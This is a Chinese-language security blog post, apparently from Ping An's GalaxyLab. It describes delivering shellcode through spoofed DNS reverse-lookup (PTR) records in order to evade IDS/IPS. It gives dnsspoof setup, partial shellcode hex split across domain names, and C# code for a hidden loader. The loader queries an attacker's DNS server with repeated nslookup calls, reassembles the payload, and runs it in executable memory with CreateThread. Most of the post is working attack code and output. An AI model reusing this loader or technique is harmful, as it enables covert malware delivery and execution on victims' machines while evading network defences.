---
title: 利用DNS 反向解析执行shellcode
date: 2023-12-01T09:28:15.000Z
updated: 2023-12-01T09:28:15.000Z
published: 2022-03-07T09:28:15.000Z
taxonomies:
  tags:
    - Tech
extra:
  source: https://mp.weixin.qq.com/s/ImP59jzxfJPTX212rE_B1g?utm_source=pocket_reader
  hostname: mp.weixin.qq.com
  author: 罗逸
  original_title: 利用DNS 反向解析执行shellcode
  original_lang: zh-CN

---

**0x01 什么是DNS反向解析**

DNS 反向解析即通过查找IP地址的PTR记录来得到该IP地址指向的域名。如图：

![Image](svg3E.svg)

如上图，我们得到了23.2.142.216这个IP反向解析出的域名是a23-2-142-216.deploy.static.akamaitechnologies.com。  

**0x02 利用思路**

既然可以指定DNS服务器，解析自己的域名，那我们就可以根据解析多个IP地址的域名来拼接得到我们想要的数据。

## **2.1 工具dnsspoof**

dnsspoof是一款DNS欺骗工具，我们使用-f来指定欺骗的域名。

如：

dns.txt里有下面一条指定欺骗的域名记录

```
192.168.1.0 "fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848.google.com"
```

## 启动DNS欺骗

```
dnsspoof -f dns.txt
```

nslookup查询DNS反向解析结果

```
λ nslookup 192.168.1.0 10.0.0.8DNS request timed out.    timeout was 2 seconds.服务器:  UnKnownAddress:  10.0.0.8名称:    "fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848.google.com"Address:  192.168.1.0
```

## **2.2 思路**

我们就可以将我们的payload数据转化成字符串数据，然后分成多个IP的反向解析域名结果，然后在受害者机器上查询出这些结果，并拼接出完整的payload。

## **2.3 优点**

最大的优点就是在内网中IDS/IPS等防火墙设备一般是不会监控DNS协议的数据。

## **2.4 缺点**

因为受反向解析域名长度的影响，子域名串最多不能超过60字符，如上“fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848”就是60字符。所以payload数据只能分成多个IP地址来反向解析。

但是nslookup一次只能查询一个ip地址的反向解析结果，需要执行多次nslookup查询。或者你在程序里封装一个DNS Client，要支持指定DNS server，支持反向解析，本人暂时还没有好的、大小又合适的解决方法，希望知道的大佬告知一下。

**0x03 C#实现DNS反向解析传输数据**

## **3.1 DnsHostCreate**

这个程序用来生成DNS 反向解析的格式化数据，即将我们输入的payload格式化成能够DNS反向解析的数据。程序需要3个参数，第一个是DomainName(即我们需要欺骗的域名，如上是google.com)，第二个是IP地址段(即用来做反向解析的IP地址段，如上是192.168.1)，第三个参数是payload数据。

格式化参数数据

```
string domain = args[0];string ipsegment = args[1];string payload = args[2];string str = payload.Replace("0x","").Replace(", ","").Replace(" ","");
```

获取需要用来存放payload数据的IP数量

```
int dns_data_lenght = str.Length / 60;if(str.Length % 60 !=0 ){    dns_data_lenght += 1;}
```

将payload数据分别截断存放在对应的IP反向解析数据中  

```
for (int i = 0; i < dns_data_lenght; i++){    string dns = "";    if (i == dns_data_lenght - 1)    {        dns = str.Substring((dns_data_lenght - 1) * 60);    }    else    {        dns = str.Substring(i * 60, 60);    }    Console.WriteLine(string.Format("{0}.{1} \"{2}.{3}\"", ipsegment, i.ToString(),dns,domain));}
```

最终得到反向解析的格式化数据如下：

```
192.168.1.0 "fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848.google.com"192.168.1.1 "8b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d41.google.com"192.168.1.2 "01c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000.google.com"    ...192.168.1.29 "9689e2ffd54883c42085c074b6668b074801c385c075d758585848050000.google.com"192.168.1.30 "000050c3e87ffdffff31302e302e302e380000000000.google.com"
```

而得到的IP数量和自定义的IP段也要记录下来，后续要用到

```
[!] IPaddress Counter is: 31[!] IP Segment: 192.168.1.
```

## **3.2 启动DNS服务**

通过上述步骤我们就得到了格式化的DNS反向解析数据，现在就来开启DNS服务。

将上述得到的Dns Host Txt结果保存成文本，并放到作为DNS服务器的VPS上，然后下载dnsspoo。

```
apt-get install dnsspoof -y
```

启动DNS服务  

```
dnsspoof -f dns.txt
```

nslookup验证

```
λ nslookup 192.168.1.0 10.0.0.8DNS request timed out.    timeout was 2 seconds.服务器:  UnKnownAddress:  10.0.0.8名称:    "fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848.google.com"Address:  192.168.1.0
```

## **3.3 C# DNS text Loader**

指定我们DNS反向解析参数，这里就要用到上述保存的IP段、IP数量信息，以及你的DNS server地址。

```
string _DnsServer = "10.0.0.8";string _IPaddress_Begin = "192.168.1.";int _IPaddress_Counter = 31;
```

获取单个IP的DNS反向解析数据，执行nslookup

```
ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("nslookup.exe", DNS_PTR_A + " " + DnsServer);ns_Prcs_info.RedirectStandardInput = true;ns_Prcs_info.RedirectStandardOutput = true;ns_Prcs_info.UseShellExecute = false;var random = new Random();System.Threading.Thread.Sleep(random.Next(1, 800));Process nslookup = new Process();nslookup.StartInfo = ns_Prcs_info;nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;nslookup.Start();string computerList = nslookup.StandardOutput.ReadToEnd();
```

这样获得的数据如下：  

```
DNS request timed out.    timeout was 2 seconds.服务器:  UnKnownAddress:  10.0.0.8名称:    "fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848.google.com"Address:  192.168.1.0
```

这些数据并不能使用，我们需要提取出payload数据，即fc4883e4f0e8c8000000415141505251564831d265488b5260488b521848。

提取出payload数据

```
string[] lines = computerList.Split('\r', 'n');string last_line = lines[lines.Length - 4];string temp_1 = last_line.Remove(0, 9);_Records = "\"" + temp_1;int i = temp_1.LastIndexOf('.');string temp_2 = temp_1.Remove(i, (temp_1.Length - i));int b = temp_2.LastIndexOf('.');string final = temp_2.Remove(b, temp_2.Length - b);
```

这样我们就获得了某个IP对应的payload数据字符串。

获取全部的payload数据字符串

```
for (int i = 0; i < _IPaddress_Counter; i++){    _DATA[i] = __nslookup(_IPaddress_Begin + i, _DnsServer);    DATA += _DATA[i].ToString();}
```

这里就是循环遍历所需来获得完整的payload数据字符串，这里就是在重复执行nslookup，我也暂时没有找到好的方法替代，希望有知道的人告诉一下。

将payload字符串转换成字节数组

```
object tmp = new object();byte[] __Bytes = new byte[DATA.Length / 2];for (int i = 0; i < __Bytes.Length - 1; i++){    int start = i * 2;    tmp = DATA.Substring(start, 2);    byte current = Convert.ToByte("0x" + tmp.ToString(), 16);    __Bytes[i] = current;}
```

## 调用创建线程来运行payload

```
UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);
```

**0x04 运行结果**

生成格式化的DNS反向解析数据

![Image](svg3E.svg)

   

启动DNS服务

![Image](svg3E.svg)

运行反向解析后的结果  

在重复执行nslookup

![Image](svg3E.svg)

反向解析的日志  

![Image](svg3E.svg)

最终执行了payload

![Image](svg3E.svg)

**0x05 结论**

我们可以利用DNS反向解析来传输数据，可以很好的躲避IDS/IPS的检测。

银河实验室

![Image](svg3E.svg)

银河实验室（GalaxyLab）是平安集团信息安全部下一个相对独立的安全实验室，主要从事安全技术研究和安全测试工作。团队内现在覆盖逆向、物联网、Web、Android、iOS、云平台区块链安全等多个安全方向。

官网：http://galaxylab.pingan.com.cn/
